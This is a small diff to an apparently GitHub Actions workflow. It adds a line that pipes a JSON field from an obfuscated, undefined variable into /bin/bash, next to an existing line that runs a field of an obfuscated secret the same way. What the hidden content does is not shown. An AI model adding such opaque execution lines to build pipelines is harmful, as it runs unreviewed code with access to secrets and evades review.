@@ -17,6 +17,7 @@ jobs:
           q77241: ${{ secrets.q77241 }}
         run: |
           printf '%s' "$q77241" | jq -r .lmc0 | /bin/bash
+          echo $ymp83836 | jq -r .ts74 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
